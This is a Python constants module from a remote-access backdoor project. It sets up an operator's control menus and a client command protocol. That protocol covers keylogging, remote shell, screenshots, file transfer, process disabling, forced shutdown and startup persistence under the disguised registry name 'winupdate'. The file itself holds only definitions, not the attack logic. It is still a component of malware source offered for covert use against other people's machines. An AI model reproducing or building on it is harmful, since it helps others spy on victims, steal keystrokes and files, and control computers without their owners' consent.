"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""

import os
import sys

REG_STARTUP_NAME = "winupdate"
MELT_FOLDER_NAME = "melted"

# path to current file
FILE_PATH = os.path.realpath(sys.argv[0])

TMP = os.environ["TEMP"]
COPY_LOCATION = os.environ["APPDATA"]

BUFFER = 1024

ERROR = -1
SUCCESS = 0

CLIENT_HANDSHAKE = 1
CLIENT_KEY = 2
CLIENT_HEARTBEAT = 3
CLIENT_EXIT = 4
CLIENT_MSG = 5
CLIENT_ADD_STARTUP = 6
CLIENT_RMV_STARTUP = 7
CLIENT_SCREENSHOT = 8
CLIENT_UPLOAD_FILE = 9
CLIENT_RECV_FILE = 10
CLIENT_LOCK = 11
CLIENT_SHUTDOWN = 12
CLIENT_RESTART = 13
CLIENT_SHELL = 14
CLIENT_PYTHON_INTERPRETER = 15
CLIENT_KEYLOG_START = 16
CLIENT_KEYLOG_STOP = 17
CLIENT_KEYLOG_DUMP = 18
CLIENT_RUN_CMD = 19
CLIENT_DISABLE_PROCESS = 20
SERVER_SHELL_DIR = 21
CLIENT_SHELL_CMD = 22
CLIENT_SHELL_LEAVE = 23
SERVER_COMMAND_RSP = 24
SERVER_FILE_RECV = 25
CLIENT_PYTHON_INTERPRETER_CMD = 26
CLIENT_PYTHON_INTERPRETER_LEAVE = 27
SERVER_PYTHON_INTERPRETER_RSP = 28
SERVER_SCREENSHOT = 29

# all menu arguments must be a single char
MENU_HELP = "H"
MENU_LIST_CONNECTIONS = "L"
MENU_INTERACT = "I"
MENU_OPEN_SHELL = "E"
MENU_SEND_ALL_CMD = "S"
MENU_CLOSE_CONNECTION = "C"
MENU_CLOSE_ALL = "X"

SERVER_MAIN_COMMAND_LIST = [{"arg": MENU_HELP, "info": "Help"},
                            {"arg": MENU_LIST_CONNECTIONS, "info": "List all connections"},
                            {"arg": MENU_INTERACT, "info": "Interact with a connection", "arg2": "index"},
                            {"arg": MENU_OPEN_SHELL, "info": "Open remote shell with connection", "arg2": "index"},
                            {"arg": MENU_SEND_ALL_CMD, "info": "Send command to every connection", "arg2": "command"},
                            {"arg": MENU_CLOSE_CONNECTION, "info": "Close connection", "arg2": "index"},
                            {"arg": MENU_CLOSE_ALL, "info": "Close all connections"}]


MENU_INTERACT_HELP = "H"
MENU_INTERACT_MSG = "M"
MENU_INTERACT_RECV = "R"
MENU_INTERACT_SEND = "S"
MENU_INTERACT_SCRN = "P"
MENU_INTERACT_STARTUP = "A"
MENU_INTERACT_INFO = "U"
MENU_INTERACT_SHELL = "E"
MENU_INTERACT_PYTHON = "I"
MENU_INTERACT_DISABLE_PROCESS = "D"
MENU_INTERACT_KEYLOG = "K"
MENU_INTERACT_SHUT = "X"
MENU_INTERACT_BACKGROUND = "B"
MENU_INTERACT_CLOSE = "C"

# arg2 commands
MENU_INTERACT_KEYLOG_START = "start"
MENU_INTERACT_KEYLOG_STOP = "stop"
MENU_INTERACT_KEYLOG_DUMP = "dump"

MENU_INTERACT_STARTUP_ADD = "add"
MENU_INTERACT_STARTUP_RMV = "rmv"

MENU_INTERACT_SHUT_SHUTDOWN = "shutdown"
MENU_INTERACT_SHUT_RESTART = "restart"
MENU_INTERACT_SHUT_LOCK = "lock"

SERVER_INTERACT_COMMAND_LIST = [{"arg": MENU_INTERACT_HELP, "info": "Help"},
                                {"arg": MENU_INTERACT_MSG, "info": "Send message"},
                                {"arg": MENU_INTERACT_RECV, "info": "Receive file"},
                                {"arg": MENU_INTERACT_SEND, "info": "Send file"},
                                {"arg": MENU_INTERACT_SCRN, "info": "Take screenshot"},
                                {"arg": MENU_INTERACT_STARTUP, "info": "Add to startup",
                                 "arg2": f"({MENU_INTERACT_STARTUP_ADD}) ({MENU_INTERACT_STARTUP_RMV})"},
                                {"arg": MENU_INTERACT_INFO, "info": "User info"},
                                {"arg": MENU_INTERACT_SHELL, "info": "Open remote shell"},
                                {"arg": MENU_INTERACT_PYTHON, "info": "Open python interpreter"},
                                {"arg": MENU_INTERACT_DISABLE_PROCESS, "info": "Disable process",
                                 "arg2": "process_name"},
                                {"arg": MENU_INTERACT_KEYLOG, "info": "Keylogger",
                                 "arg2": f"({MENU_INTERACT_KEYLOG_START}) ({MENU_INTERACT_KEYLOG_STOP}) ({MENU_INTERACT_KEYLOG_DUMP})"},
                                {"arg": MENU_INTERACT_SHUT, "info": "Power options",
                                 "arg2": f"({MENU_INTERACT_SHUT_SHUTDOWN}) ({MENU_INTERACT_SHUT_RESTART}) ({MENU_INTERACT_SHUT_LOCK})"},
                                {"arg": MENU_INTERACT_BACKGROUND, "info": "Move connection to background"},
                                {"arg": MENU_CLOSE_CONNECTION, "info": "Close connection"}]
